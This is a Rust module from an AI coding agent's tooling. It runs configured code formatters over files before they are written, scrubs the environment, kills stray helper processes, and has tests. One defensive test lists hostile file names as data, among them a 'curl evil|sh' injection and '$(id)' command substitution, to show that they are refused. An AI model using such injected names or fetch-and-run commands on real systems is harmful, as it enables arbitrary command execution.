//! Formatters: normalise a file as the agent writes it.
//!
//! Configured per project in `.rapidlm/settings.json`:
//!
//! ```json
//! { "formatters": [
//!     { "command": ["rustfmt", "--edition", "2024"], "globs": ["*.rs"] },
//!     { "name": "prettier", "command": ["prettier", "--stdin-filepath", "{path}"],
//!       "globs": ["*.ts", "*.tsx", "*.json"], "timeout_ms": 15000 }
//! ] }
//! ```
//!
//! The file's content goes to the formatter's standard input and the formatted
//! content comes back on its standard output, **before** the file is written.
//! That keeps the write atomic and the change record exact: the ledger sees one
//! write of the final bytes, never a write followed by a second rewrite, and the
//! file on disk is never half-formatted. `{path}` in an argument is replaced by
//! the file's project-relative path, for formatters that pick a language or a
//! configuration file from it; the command runs in the project root.
//!
//! A formatter is a convenience, not a gate. If it fails, times out, cannot be
//! started, or returns nothing for non-empty input, the file is written exactly
//! as the model sent it and the failure is reported in the tool result, where it
//! doubles as feedback (a formatter that rejects the input has usually found a
//! syntax error). The first formatter whose globs match a file is the only one
//! that runs.
//!
//! A pattern with no `/` matches the file's name at any depth (`*.rs` covers
//! `src/a.rs`); one with a `/` matches the whole project-relative path.

use std::io::{Read, Write};
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

/// Most formatters accepted from one settings file.
pub const MAX_FORMATTERS: usize = 16;
/// Most argument words in one command.
pub const MAX_COMMAND_ARGS: usize = 16;
/// Most glob patterns per formatter.
pub const MAX_GLOBS: usize = 32;
/// Time allowed when a formatter sets none.
pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(10);
/// Longest timeout a formatter may ask for.
pub const MAX_TIMEOUT: Duration = Duration::from_secs(120);
/// Most formatted output accepted.
const MAX_OUTPUT_BYTES: usize = 16 * 1024 * 1024;
/// Bytes of a failing formatter's stderr shown to the model.
const STDERR_TAIL_BYTES: usize = 600;

/// One configured formatter.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct Formatter {
    name: String,
    command: Vec<String>,
    globs: Vec<String>,
    timeout: Duration,
}

/// The project's formatters, in the order the settings list them.
#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub struct Formatters(Vec<Formatter>);

/// What running the formatters on one file came to.
#[derive(Debug, Eq, PartialEq)]
pub enum Outcome {
    /// No formatter claims this file.
    NotApplicable,
    /// A formatter ran and changed nothing.
    Unchanged { by: String },
    /// A formatter ran and returned different content.
    Formatted { by: String, bytes: Vec<u8> },
    /// A formatter was due and did not produce usable output. The caller writes
    /// the original content.
    Failed { by: String, reason: String },
}

impl Formatters {
    /// Parse the `formatters` array of a settings document. Entries that are
    /// malformed are dropped and listed in the second value, so a typo is not
    /// silently inert.
    #[must_use]
    pub fn parse(settings: &serde_json::Value) -> (Option<Self>, Vec<String>) {
        let Some(entries) = settings.get("formatters").and_then(|v| v.as_array()) else {
            return (None, Vec::new());
        };
        let mut formatters = Vec::new();
        let mut problems = Vec::new();
        for (index, entry) in entries.iter().enumerate() {
            if formatters.len() >= MAX_FORMATTERS {
                problems.push(format!(
                    "formatters: more than {MAX_FORMATTERS}; the rest are ignored"
                ));
                break;
            }
            match parse_one(entry) {
                Ok(formatter) => formatters.push(formatter),
                Err(why) => problems.push(format!("formatters[{index}]: {why}")),
            }
        }
        (
            (!formatters.is_empty()).then_some(Self(formatters)),
            problems,
        )
    }

    /// Whether any formatter is configured.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }

    /// The formatter that claims `relative`, if any.
    fn claiming(&self, relative: &str) -> Option<&Formatter> {
        self.0
            .iter()
            .find(|f| f.globs.iter().any(|g| matches_glob(g, relative)))
    }

    /// Format `content` for the file at `relative` under `root`.
    #[must_use]
    pub fn format(&self, root: &Path, relative: &str, content: &[u8]) -> Outcome {
        let Some(formatter) = self.claiming(relative) else {
            return Outcome::NotApplicable;
        };
        let by = formatter.name.clone();
        match run(formatter, root, relative, content) {
            Ok(out) if out == content => Outcome::Unchanged { by },
            Ok(out) => Outcome::Formatted { by, bytes: out },
            Err(reason) => Outcome::Failed { by, reason },
        }
    }
}

fn parse_one(entry: &serde_json::Value) -> Result<Formatter, String> {
    let object = entry.as_object().ok_or("not an object")?;
    let command: Vec<String> = object
        .get("command")
        .and_then(|v| v.as_array())
        .ok_or("`command` must be an array of strings")?
        .iter()
        .map(|word| {
            word.as_str()
                .map(str::to_owned)
                .ok_or("`command` holds a non-string")
        })
        .collect::<Result<_, _>>()?;
    if command.is_empty() || command.iter().any(String::is_empty) {
        return Err("`command` is empty".to_owned());
    }
    if command.len() > MAX_COMMAND_ARGS {
        return Err(format!("`command` has more than {MAX_COMMAND_ARGS} words"));
    }
    let globs: Vec<String> = object
        .get("globs")
        .and_then(|v| v.as_array())
        .map(|list| {
            list.iter()
                .filter_map(|g| g.as_str().map(str::to_owned))
                .collect()
        })
        .unwrap_or_default();
    if globs.is_empty() {
        // Running a formatter over every file the model writes is never what
        // was meant, and the cost of asking is one line in the settings.
        return Err("`globs` is required".to_owned());
    }
    if globs.len() > MAX_GLOBS {
        return Err(format!("`globs` has more than {MAX_GLOBS} patterns"));
    }
    let timeout = object
        .get("timeout_ms")
        .and_then(|v| v.as_u64())
        .map_or(DEFAULT_TIMEOUT, Duration::from_millis)
        .min(MAX_TIMEOUT);
    let name = object
        .get("name")
        .and_then(|v| v.as_str())
        .filter(|n| !n.trim().is_empty())
        .map_or_else(|| program_name(&command[0]), str::to_owned);
    Ok(Formatter {
        name,
        command,
        globs,
        timeout,
    })
}

fn program_name(program: &str) -> String {
    Path::new(program)
        .file_stem()
        .map_or_else(|| program.to_owned(), |s| s.to_string_lossy().into_owned())
}

fn matches_glob(pattern: &str, relative: &str) -> bool {
    if pattern.contains('/') {
        crate::exec_tools::glob_path_match(pattern, relative)
    } else {
        let name = relative.rsplit('/').next().unwrap_or(relative);
        crate::exec_tools::glob_path_match(pattern, name)
    }
}

/// Environment a formatter is given: enough to find its program, its
/// configuration and a temp directory, and nothing else. The process's own
/// environment holds provider keys and tokens that a program named in a
/// repository's settings has no business with.
const KEPT_ENV: &[&str] = &[
    "PATH",
    "HOME",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "TMPDIR",
    "XDG_CONFIG_HOME",
    "XDG_CACHE_HOME",
    "CARGO_HOME",
    "RUSTUP_HOME",
];

/// Whether `relative` may be put in an argument. The name is chosen by the
/// model, and a formatter is often a wrapper around a shell or a tool that
/// takes options: a name that begins with `-` is an option, and one with
/// shell syntax is a command. Anything outside plain path characters is not
/// passed, so the file is simply written unformatted.
fn path_is_safe_for_argv(relative: &str) -> bool {
    !relative.starts_with('-')
        && relative.split('/').all(|part| !part.starts_with('-'))
        && relative.chars().all(|c| {
            c.is_ascii_alphanumeric()
                || matches!(c, '.' | '_' | '/' | '-' | '+' | '@' | '=' | ',' | ':')
        })
}

/// Collects one pipe on a thread, to the end, keeping at most `cap` bytes.
///
/// Reading to the end even past the cap keeps the child from blocking on a full
/// pipe. The buffer is shared, so what has arrived can be taken even if a
/// grandchild holds the pipe open and the thread never sees the end.
struct Collected {
    state: std::sync::Arc<(std::sync::Mutex<CollectedState>, std::sync::Condvar)>,
}

#[derive(Default)]
struct CollectedState {
    bytes: Vec<u8>,
    overflowed: bool,
    finished: bool,
}

impl Collected {
    fn start(mut pipe: impl Read + Send + 'static, cap: usize) -> Self {
        let state: std::sync::Arc<(std::sync::Mutex<CollectedState>, std::sync::Condvar)> =
            std::sync::Arc::default();
        let shared = std::sync::Arc::clone(&state);
        std::thread::spawn(move || {
            let mut chunk = [0u8; 8192];
            loop {
                let read = pipe.read(&mut chunk).unwrap_or(0);
                let (lock, cv) = &*shared;
                let mut guard = lock
                    .lock()
                    .unwrap_or_else(std::sync::PoisonError::into_inner);
                if read == 0 {
                    guard.finished = true;
                    cv.notify_all();
                    return;
                }
                let room = cap.saturating_sub(guard.bytes.len());
                if read > room {
                    guard.overflowed = true;
                }
                guard.bytes.extend_from_slice(&chunk[..read.min(room)]);
            }
        });
        Self { state }
    }

    /// What has arrived, after giving the end of the stream `grace` to come.
    fn take(&self, grace: Duration) -> (Vec<u8>, bool) {
        let (lock, cv) = &*self.state;
        let guard = lock
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let (mut guard, _) = cv
            .wait_timeout_while(guard, grace, |s| !s.finished)
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        (std::mem::take(&mut guard.bytes), guard.overflowed)
    }
}

/// End the child and everything it started in its process group.
fn kill_group(child: &mut std::process::Child) {
    let pid = child.id();
    #[cfg(unix)]
    {
        let _ = Command::new("kill")
            .args(["-KILL", "--", &format!("-{pid}")])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
    #[cfg(windows)]
    {
        let _ = Command::new("taskkill")
            .args(["/T", "/F", "/PID", &pid.to_string()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
    let _ = child.kill();
}

/// Run `formatter` over `content`, within its timeout.
fn run(
    formatter: &Formatter,
    root: &Path,
    relative: &str,
    content: &[u8],
) -> Result<Vec<u8>, String> {
    let uses_path = formatter.command.iter().any(|word| word.contains("{path}"));
    if uses_path && !path_is_safe_for_argv(relative) {
        return Err("the file name has characters that are not passed to a formatter".to_owned());
    }
    let words: Vec<String> = formatter
        .command
        .iter()
        .map(|word| word.replace("{path}", relative))
        .collect();
    let mut command = Command::new(&words[0]);
    command
        .args(&words[1..])
        .current_dir(root)
        .env_clear()
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    for key in KEPT_ENV {
        if let Ok(value) = std::env::var(key) {
            command.env(key, value);
        }
    }
    for (key, value) in protocol::host_env::platform_base_env() {
        command.env(key, value);
    }
    // Its own process group, so a timeout (or a formatter that leaves a helper
    // behind) can end everything it started rather than only the direct child.
    #[cfg(unix)]
    std::os::unix::process::CommandExt::process_group(&mut command, 0);
    let mut child = command
        .spawn()
        .map_err(|err| format!("could not start `{}`: {err}", words[0]))?;
    let input = content.to_vec();
    let mut stdin = child.stdin.take();
    std::thread::spawn(move || {
        if let Some(pipe) = stdin.as_mut() {
            let _ = pipe.write_all(&input);
        }
        drop(stdin);
    });
    let stdout = Collected::start(
        child.stdout.take().ok_or("no standard output")?,
        MAX_OUTPUT_BYTES,
    );
    let stderr = Collected::start(child.stderr.take().ok_or("no standard error")?, 64 * 1024);
    let deadline = Instant::now() + formatter.timeout;
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break Ok(status),
            Ok(None) if Instant::now() >= deadline => {
                kill_group(&mut child);
                let _ = child.wait();
                break Err(format!(
                    "timed out after {} ms",
                    formatter.timeout.as_millis()
                ));
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(5)),
            Err(err) => break Err(err.to_string()),
        }
    };
    // Whatever the formatter left running is not wanted past this point. Its
    // own output is already in the pipe; a helper holding the pipe open only
    // delays the end of the stream, which `take` does not wait for long.
    kill_group(&mut child);
    let status = status?;
    let grace = Duration::from_millis(300);
    let (out, overflowed) = stdout.take(grace);
    let (err, _) = stderr.take(Duration::from_millis(50));
    if !status.success() {
        let text = String::from_utf8_lossy(&err);
        let text = text.trim();
        let tail = text
            .char_indices()
            .rev()
            .nth(STDERR_TAIL_BYTES)
            .map_or(text, |(at, _)| &text[at..]);
        return Err(format!(
            "exited with {}{}",
            status
                .code()
                .map_or_else(|| "a signal".to_owned(), |c| c.to_string()),
            if tail.is_empty() {
                String::new()
            } else {
                format!(": {tail}")
            }
        ));
    }
    if overflowed {
        return Err("produced more output than is accepted".to_owned());
    }
    // A formatter that succeeds is still not trusted to have produced the file:
    // what it printed may be a usage message, a warning, or another encoding.
    if out.is_empty() && !content.is_empty() {
        return Err("returned nothing for a non-empty file".to_owned());
    }
    if std::str::from_utf8(content).is_ok() && std::str::from_utf8(&out).is_err() {
        return Err("returned text that is not valid UTF-8".to_owned());
    }
    if content.len() > 256 && out.len() * 10 < content.len() {
        return Err(
            "returned far less text than it was given, which looks like an error message rather than a file"
                .to_owned(),
        );
    }
    Ok(out)
}

/// The sentence appended to a write's result.
#[must_use]
pub fn describe(outcome: &Outcome) -> Option<String> {
    match outcome {
        Outcome::NotApplicable | Outcome::Unchanged { .. } => None,
        Outcome::Formatted { by, .. } => Some(format!(
            "formatted by {by}: the file on disk differs from what you sent; read it again before editing it"
        )),
        Outcome::Failed { by, reason } => Some(format!(
            "formatter {by} did not run cleanly ({reason}); the file was written as you sent it"
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse(text: &str) -> (Option<Formatters>, Vec<String>) {
        Formatters::parse(&serde_json::from_str(text).expect("json"))
    }

    fn sh(script: &str) -> String {
        // A formatter given as argv; `sh -c` stands in for a real tool.
        serde_json::to_string(&serde_json::json!(["sh", "-c", script])).expect("json")
    }

    fn one(script: &str, globs: &str) -> Formatters {
        let (formatters, problems) = parse(&format!(
            r#"{{"formatters":[{{"command":{},"globs":{globs}}}]}}"#,
            sh(script)
        ));
        assert!(problems.is_empty(), "{problems:?}");
        formatters.expect("configured")
    }

    fn root() -> std::path::PathBuf {
        std::env::temp_dir()
    }

    #[test]
    fn a_settings_file_with_no_formatters_configures_none() {
        assert_eq!(parse("{}"), (None, Vec::new()));
        assert_eq!(parse(r#"{"formatters":[]}"#), (None, Vec::new()));
    }

    #[test]
    fn malformed_entries_are_dropped_and_named() {
        let (formatters, problems) = parse(
            r#"{"formatters":[
                {"command":["a"]},
                {"globs":["*.rs"]},
                {"command":[],"globs":["*.rs"]},
                {"command":["ok"],"globs":["*.rs"]},
                "nope"
            ]}"#,
        );
        assert_eq!(formatters.expect("one valid").0.len(), 1);
        assert_eq!(problems.len(), 4, "{problems:?}");
        assert!(problems[0].contains("globs") && problems[0].starts_with("formatters[0]"));
    }

    #[test]
    fn the_name_defaults_to_the_program_and_timeouts_are_capped() {
        let (formatters, _) = parse(
            r#"{"formatters":[{"command":["/usr/bin/rustfmt","--x"],"globs":["*.rs"],"timeout_ms":99999999}]}"#,
        );
        let f = &formatters.expect("f").0[0];
        assert_eq!(f.name, "rustfmt");
        assert_eq!(f.timeout, MAX_TIMEOUT);
    }

    #[test]
    fn a_pattern_without_a_slash_matches_the_name_at_any_depth() {
        assert!(matches_glob("*.rs", "a.rs"));
        assert!(matches_glob("*.rs", "src/deep/a.rs"));
        assert!(!matches_glob("*.rs", "src/a.py"));
        assert!(matches_glob("src/*.rs", "src/a.rs"));
        assert!(!matches_glob("src/*.rs", "other/a.rs"));
        assert!(!matches_glob("src/*.rs", "src/deep/a.rs"));
    }

    #[cfg(unix)]
    #[test]
    fn content_goes_in_on_stdin_and_the_formatted_text_comes_back() {
        let formatters = one("tr a-z A-Z", r#"["*.txt"]"#);
        match formatters.format(&root(), "dir/a.txt", b"hello\n") {
            Outcome::Formatted { by, bytes } => {
                assert_eq!(by, "sh");
                assert_eq!(bytes, b"HELLO\n");
            }
            other => panic!("{other:?}"),
        }
    }

    #[cfg(unix)]
    #[test]
    fn already_formatted_content_is_reported_unchanged() {
        let formatters = one("cat", r#"["*.txt"]"#);
        assert_eq!(
            formatters.format(&root(), "a.txt", b"same"),
            Outcome::Unchanged {
                by: "sh".to_owned()
            }
        );
    }

    #[test]
    fn a_file_no_formatter_claims_is_left_alone() {
        let (formatters, _) = parse(r#"{"formatters":[{"command":["x"],"globs":["*.rs"]}]}"#);
        assert_eq!(
            formatters.expect("f").format(&root(), "a.py", b"x"),
            Outcome::NotApplicable
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_failing_formatter_reports_its_stderr_and_never_returns_output() {
        let formatters = one("echo 'syntax error at line 3' >&2; exit 2", r#"["*.txt"]"#);
        match formatters.format(&root(), "a.txt", b"x") {
            Outcome::Failed { reason, .. } => {
                assert!(reason.contains("exited with 2"), "{reason}");
                assert!(reason.contains("syntax error at line 3"), "{reason}");
            }
            other => panic!("{other:?}"),
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_formatter_that_returns_nothing_for_real_input_is_a_failure() {
        let formatters = one("cat >/dev/null", r#"["*.txt"]"#);
        assert!(matches!(
            formatters.format(&root(), "a.txt", b"content"),
            Outcome::Failed { .. }
        ));
        // An empty file legitimately formats to nothing.
        assert!(matches!(
            formatters.format(&root(), "a.txt", b""),
            Outcome::Unchanged { .. }
        ));
    }

    #[cfg(unix)]
    #[test]
    fn a_formatter_that_hangs_is_killed_at_its_timeout() {
        let (formatters, _) = parse(&format!(
            r#"{{"formatters":[{{"command":{},"globs":["*.txt"],"timeout_ms":100}}]}}"#,
            sh("sleep 30")
        ));
        let started = Instant::now();
        match formatters.expect("f").format(&root(), "a.txt", b"x") {
            Outcome::Failed { reason, .. } => assert!(reason.contains("timed out"), "{reason}"),
            other => panic!("{other:?}"),
        }
        assert!(started.elapsed() < Duration::from_secs(10));
    }

    #[test]
    fn a_missing_program_is_a_failure_not_a_panic() {
        let (formatters, _) = parse(
            r#"{"formatters":[{"command":["definitely-not-a-real-formatter-xyz"],"globs":["*.txt"]}]}"#,
        );
        match formatters.expect("f").format(&root(), "a.txt", b"x") {
            Outcome::Failed { reason, .. } => {
                assert!(reason.contains("could not start"), "{reason}")
            }
            other => panic!("{other:?}"),
        }
    }

    #[cfg(unix)]
    #[test]
    fn the_path_placeholder_is_the_relative_path_and_the_command_runs_in_the_root() {
        let dir = std::env::temp_dir().join(format!("rapid-fmt-{}", std::process::id()));
        std::fs::create_dir_all(&dir).expect("dir");
        let (formatters, _) = parse(
            r#"{"formatters":[{"command":["sh","-c","echo \"$1 in $(pwd)\"","fmt","{path}"],"globs":["*.txt"]}]}"#,
        );
        let out = formatters.expect("f").format(&dir, "sub/a.txt", b"x");
        let _ = std::fs::remove_dir_all(&dir);
        match out {
            Outcome::Formatted { bytes, .. } => {
                let text = String::from_utf8(bytes).expect("utf8");
                assert!(text.starts_with("sub/a.txt in "), "{text}");
                assert!(text.contains("rapid-fmt-"), "{text}");
            }
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn the_first_matching_formatter_is_the_only_one_that_runs() {
        let (formatters, _) = parse(
            r#"{"formatters":[
                {"name":"first","command":["a"],"globs":["*.rs"]},
                {"name":"second","command":["b"],"globs":["*.rs"]}
            ]}"#,
        );
        assert_eq!(
            formatters
                .expect("f")
                .claiming("x.rs")
                .map(|f| f.name.as_str()),
            Some("first")
        );
    }

    #[test]
    fn descriptions_tell_the_model_what_to_do() {
        assert!(describe(&Outcome::NotApplicable).is_none());
        assert!(describe(&Outcome::Unchanged { by: "x".into() }).is_none());
        let formatted = describe(&Outcome::Formatted {
            by: "rustfmt".into(),
            bytes: vec![],
        })
        .expect("note");
        assert!(formatted.contains("read it again"));
        let failed = describe(&Outcome::Failed {
            by: "p".into(),
            reason: "boom".into(),
        })
        .expect("note");
        assert!(failed.contains("written as you sent it") && failed.contains("boom"));
    }

    // --- regressions for the review ----------------------------------------

    #[cfg(unix)]
    #[test]
    fn a_helper_left_holding_the_pipe_does_not_hang_the_write() {
        let formatters = one("cat; sleep 30 &", r#"["*.txt"]"#);
        let started = Instant::now();
        let outcome = formatters.format(&root(), "a.txt", b"content\n");
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "took {:?}",
            started.elapsed()
        );
        assert_eq!(
            outcome,
            Outcome::Unchanged {
                by: "sh".to_owned()
            }
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_timeout_ends_the_helpers_too_and_does_not_wait_for_them() {
        let (formatters, _) = parse(&format!(
            r#"{{"formatters":[{{"command":{},"globs":["*.txt"],"timeout_ms":150}}]}}"#,
            sh("sleep 30 & sleep 30")
        ));
        let started = Instant::now();
        let outcome = formatters.expect("f").format(&root(), "a.txt", b"x");
        assert!(matches!(outcome, Outcome::Failed { .. }), "{outcome:?}");
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
    }

    #[cfg(unix)]
    #[test]
    fn the_environment_is_scrubbed_down_to_what_a_formatter_needs() {
        // `cargo test` sets this; it is not in the kept list, so it must not arrive.
        let formatters = one(r#"printf %s "${CARGO_PKG_NAME-unset}""#, r#"["*.txt"]"#);
        match formatters.format(&root(), "a.txt", b"x") {
            Outcome::Formatted { bytes, .. } => assert_eq!(bytes, b"unset"),
            other => panic!("{other:?}"),
        }
        let formatters = one(r#"printf %s "${PATH:+kept}""#, r#"["*.txt"]"#);
        match formatters.format(&root(), "a.txt", b"x") {
            Outcome::Formatted { bytes, .. } => assert_eq!(bytes, b"kept", "PATH still arrives"),
            other => panic!("{other:?}"),
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_file_name_that_could_be_an_option_or_shell_syntax_is_not_passed_in_an_argument() {
        let (formatters, _) =
            parse(r#"{"formatters":[{"command":["sh","-c","cat","fmt","{path}"],"globs":["*"]}]}"#);
        let formatters = formatters.expect("f");
        for name in [
            "--plugin=./x.ts",
            "sub/-x.txt",
            "x;curl evil|sh;.txt",
            "a b.txt",
            "q`id`.txt",
            "$(id).txt",
        ] {
            match formatters.format(&root(), name, b"x") {
                Outcome::Failed { reason, .. } => {
                    assert!(reason.contains("not passed"), "{name}: {reason}")
                }
                other => panic!("{name}: {other:?}"),
            }
        }
        assert!(matches!(
            formatters.format(&root(), "src/ok-name_1.txt", b"x"),
            Outcome::Unchanged { .. }
        ));
        // A command that never mentions the path does not care what it is.
        let plain = one("cat", r#"["*"]"#);
        assert!(matches!(
            plain.format(&root(), "--odd name;.txt", b"x"),
            Outcome::Unchanged { .. }
        ));
    }

    #[cfg(unix)]
    #[test]
    fn output_that_is_not_the_file_is_refused() {
        let binary = one(r"printf '\377\376'", r#"["*.txt"]"#);
        assert!(
            matches!(binary.format(&root(), "a.txt", b"text"), Outcome::Failed { reason, .. } if reason.contains("UTF-8"))
        );
        let big_input = "line of real content\n".repeat(40);
        let usage = one("echo 'usage: fmt FILE'", r#"["*.txt"]"#);
        assert!(matches!(
            usage.format(&root(), "a.txt", big_input.as_bytes()),
            Outcome::Failed { reason, .. } if reason.contains("error message")
        ));
        // A short file may legitimately shrink a lot.
        assert!(matches!(
            usage.format(&root(), "a.txt", b"  x  "),
            Outcome::Formatted { .. }
        ));
    }

    #[cfg(unix)]
    #[test]
    fn a_noisy_stderr_does_not_turn_a_good_format_into_a_failure() {
        let formatters = one(
            "head -c 300000 /dev/zero | tr '\\0' w >&2; cat",
            r#"["*.txt"]"#,
        );
        assert_eq!(
            formatters.format(&root(), "a.txt", b"fine\n"),
            Outcome::Unchanged {
                by: "sh".to_owned()
            }
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_helper_the_formatter_started_is_ended_with_it() {
        let dir = std::env::temp_dir().join(format!("rapid-fmt-stray-{}", std::process::id()));
        std::fs::create_dir_all(&dir).expect("dir");
        let pidfile = dir.join("pid");
        let formatters = one(
            &format!("sleep 60 & echo $! > '{}'; cat", pidfile.display()),
            r#"["*.txt"]"#,
        );
        let outcome = formatters.format(&dir, "a.txt", b"x\n");
        assert!(matches!(outcome, Outcome::Unchanged { .. }), "{outcome:?}");
        let pid: u32 = std::fs::read_to_string(&pidfile)
            .expect("pid written")
            .trim()
            .parse()
            .expect("pid");
        let alive = |pid: u32| {
            Command::new("kill")
                .args(["-0", &pid.to_string()])
                .stderr(Stdio::null())
                .status()
                .is_ok_and(|s| s.success())
        };
        let mut gone = false;
        for _ in 0..100 {
            if !alive(pid) {
                gone = true;
                break;
            }
            std::thread::sleep(Duration::from_millis(20));
        }
        let _ = std::fs::remove_dir_all(&dir);
        if !gone {
            let _ = Command::new("kill")
                .args(["-KILL", &pid.to_string()])
                .status();
        }
        assert!(
            gone,
            "the helper the formatter left behind was still running"
        );
    }
}
